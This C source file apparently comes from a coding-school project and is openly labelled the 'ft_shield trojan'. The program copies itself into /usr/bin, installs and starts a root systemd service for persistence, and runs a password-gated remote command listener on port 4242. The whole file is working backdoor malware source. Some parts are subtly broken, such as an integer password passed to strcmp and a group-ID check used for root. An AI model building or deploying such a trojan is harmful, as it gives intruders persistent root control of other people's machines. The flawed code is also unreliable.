#include "../include/ft_shield.h"

#define SERVICE_FILE_CONTENT  "[Unit]\n"\
                              "Description=ft_shield trojan\n"\
                              "\n"\
                              "[Service]\n"\
                              "User=root\n"\
                              "Restart=on-failure\n"\
                              "RestartSec=5s\n"\
                              "ExecStart=/usr/bin/ft_shield\n"\
                              "WorkingDirectory=/\n"\
                              "StandardOutput=file:/var/log/ft_shield.log\n"\
                              "StandardError=file:/var/log/ft_shield_error.log\n"\
                              "\n"\
                              "[Install]\n"\
                              "WantedBy=multi-user.target\n"
#define MAX_CLIENT_CONNECTION_COUNT 3
#define SERVER_PORT 4242
#define PASSWORD	1234

typedef	struct	client_info
{
	bool	is_logged;
	int		password_try_count;
}			t_client_info;

typedef	struct	server
{
	int				client_count;
	int				server_sock;
	struct	pollfd	clients[MAX_CLIENT_CONNECTION_COUNT + 1];
	t_client_info	clients_info[MAX_CLIENT_CONNECTION_COUNT + 1];
}				t_server;

t_server	*g_server;

void	ft_error(char *str)
{
	write(2, str, strlen(str));
	exit(1);
}

void	handle_signal(int sig)
{
	if (sig == SIGTERM)
		exit(0);
}

void	setup_signals(void)
{
	struct sigaction sa;
	sa.sa_handler = handle_signal;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	if (sigaction(SIGTERM, &sa, NULL) < 0)
		ft_error("sigaction");
	return;
}

bool	is_bin(void)
{
	char	path[PATH_MAX], rpath[PATH_MAX];
	ssize_t	len;

	len = readlink("/proc/self/exe", path, sizeof(path)-1);
	if (len == -1)
		ft_error("readlink");
	if (!realpath(path, rpath))
		ft_error("realpath");
	if (strcmp("/usr/bin", dirname(rpath)))
		return false;
	return true;
}

void	create_daemon(void)
{
	// int		fd;
	pid_t	pid = fork();

	if (pid < 0)
		ft_error("fork");
	if (pid)
		exit(0);
	if (setsid() < 0)
		ft_error("setsid");
	if (chdir("/") < 0)
		ft_error("chdir");
	umask(0);
	// fd = open("/dev/null", O_RDWR);
	// if (fd < 0)
	// 	ft_error("open");
	// if (dup2(fd, STDIN_FILENO) < 0)
	// 	ft_error("dup stdin");
	// if (dup2(fd, STDOUT_FILENO) < 0)
	// 	ft_error("dup stdout");
	// if (dup2(fd, STDERR_FILENO) < 0)
	// 	ft_error("dup stderr");
	// if (close(fd) < 0)
	// 	ft_error("close fd");
	return ;
}

void	move_to_target(void)
{
	if (!access("/usr/bin/ft_shield", F_OK))
	{
		// I need to check the checksum of the binary to see if the same binary or not
		return;
	}
	char	bin_path[PATH_MAX], buff[4096];
	ssize_t	len = readlink("/proc/self/exe", bin_path, sizeof(bin_path)-1);
	int		src_fd, dst_fd, read_count, write_count;
	if (len == -1)
		ft_error("readlink");
	bin_path[len] = 0;
	printf("%s\n", bin_path);
	src_fd = open(bin_path, O_RDONLY);
	if (src_fd < 0)
		ft_error("open src");
	dst_fd = open("/usr/bin/ft_shield", O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (dst_fd < 0)
		ft_error("open dst");
	while ((read_count = read(src_fd, buff, sizeof(buff))) > 0)
	{
		write_count = write(dst_fd, buff, read_count);
		if (read_count != write_count)
		{
			close(src_fd);
			close(dst_fd);
			ft_error("write");
		}
	}
	close(src_fd);
	close(dst_fd);
	if (read_count < 0)
		ft_error("read");
	return;
}

void	config_service(void)
{
	if (!access("/etc/systemd/system/ft_shield.service", F_OK))
	{
		// I need to check the checksum of the service file to see if the same service we want or not
		return;
	}
	int	fd = open("/etc/systemd/system/ft_shield.service", O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd < 0)
		ft_error("open");
	if (write(fd, SERVICE_FILE_CONTENT, strlen(SERVICE_FILE_CONTENT)) < 0)
	{
		close(fd);
		ft_error("write");
	}
	close(fd);
	if (system("systemctl daemon-reload"))
		ft_error("system");
	if (system("systemctl enable ft_shield"))
		ft_error("system");
	if (system("systemctl start ft_shield"))
		ft_error("system");
	return;
}

int		init_server()
{
	int		server_sock, opt = 1;
	struct	sockaddr_in	addr = {0};

	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		ft_error("socket");
	if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
	{
		close(server_sock);
		ft_error("setsockopt");
	}
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(SERVER_PORT);
	if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		close(server_sock);
		ft_error("bind");
	}
	if (listen(server_sock, MAX_CLIENT_CONNECTION_COUNT) < 0)
	{
		close(server_sock);
		ft_error("listen");
	}
	return (server_sock);
}

void	clear_client_connection(int fd)
{
	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT; i++)
	{
		if (g_server->clients[i].fd != fd)
			continue;
		shutdown(fd, SHUT_RDWR);
		close(fd);
		g_server->clients[i].fd = -1;
		g_server->clients[i].events = POLLIN;
		g_server->clients[i].revents = 0;
		g_server->clients_info[i].is_logged = false;
		g_server->clients_info[i].password_try_count = 0;
		g_server->client_count--;
		return;
	}
}

void	send_msg_to_client(char *msg, int fd)
{
	if (send(fd, msg, strlen(msg), 0) < 0)
	{
		clear_client_connection(fd);
		ft_error("send");
	}
}

void	recv_msg_from_client(int idx)
{
	char	buff[1024];
	int		len = 0, client_fd = g_server->clients[idx].fd;

	len = recv(client_fd, buff, 1024, 0);
	if (len <= 0)
	{
		clear_client_connection(client_fd);
		ft_error("recv");
	}
	buff[len-1] = 0;
	if (!g_server->clients_info[idx].is_logged)
	{
		if (!strcmp(PASSWORD, buff))
		{
			g_server->clients_info[idx].is_logged = true;
			g_server->clients_info[idx].password_try_count = 0;
			send_msg_to_client("ft_shield $> ", client_fd);
		}
		else
		{
			g_server->clients_info[idx].password_try_count++;
			if (g_server->clients_info[idx].password_try_count < 3)
				send_msg_to_client("Wrong Password. Try again: ", client_fd);
			else
			{
				send_msg_to_client("Too many failed attempts. Disconnecting...\n", client_fd);
				clear_client_connection(client_fd);
			}
		}
	}
	else
	{
		if (handle_client_commands(client_fd, buff) != 0)
			send_msg_to_client("Error: Command failed.\n", client_fd);
		send_msg_to_client("ft_shield $> ", client_fd);
	}
}

void	client_connection()
{
	int					client_fd;
	socklen_t			client_len;
	struct	sockaddr_in	client_addr = {0};

	if ((client_fd = accept(g_server->server_sock, (struct sockaddr *)&client_addr, &client_len)) < 0)
		ft_error("accept");
	if (g_server->client_count == 3)
	{
		send_msg_to_client("Error: Failed to connect to remote trojan!\n", client_fd);
		shutdown(client_fd, SHUT_RDWR);
		close(client_fd);
		return;
	}
	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
	{
		if (g_server->clients[i].fd != -1)
			continue;
		g_server->clients[i].fd = client_fd;
		g_server->clients[i].events = POLLIN;
		g_server->client_count++;
		break;
	}
	send_msg_to_client("Please enter your password: ", client_fd);
}

void	run_server(void)
{
	int	poll_count;

	while (true)
	{
		poll_count = poll(g_server->clients, g_server->client_count+1, 5000);
		if (poll_count == 0)
			continue;
		if (poll_count < 0)
		{
			for (int i = 0; i < g_server->client_count; i++)
				clear_client_connection(g_server->clients[i].fd);
			break;
		}
		for (int i = 0; i < g_server->client_count+1; i++)
		{
			if (g_server->clients[i].revents & POLLIN)
			{
				if (g_server->clients[i].fd == g_server->server_sock)
					client_connection();
				else
					recv_msg_from_client(i);
			}
		}
	}
}

void	spawn_server(void)
{
	g_server = (t_server*)calloc(1, sizeof(t_server));

	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
	{
		g_server->clients[i].fd = -1;
		g_server->clients[i].events = POLLIN;
		g_server->clients[i].revents = 0;
		g_server->clients_info[i].is_logged = false;
		g_server->clients_info[i].password_try_count = 0;
	}
	g_server->server_sock = init_server();
	g_server->clients[0].fd = g_server->server_sock;
	run_server();
}

int	main()
{
	if (getegid())
		ft_error(SUDO);
	printf("%s", LOGINS);
	setup_signals();
	if (is_bin())
	{
		write(1, "I'm in /bin\n", 12);
		spawn_server();
	}
	else
	{
		write(1, "I'm not in /bin\n", 16);
		create_daemon();
		move_to_target();
		config_service();
	}
}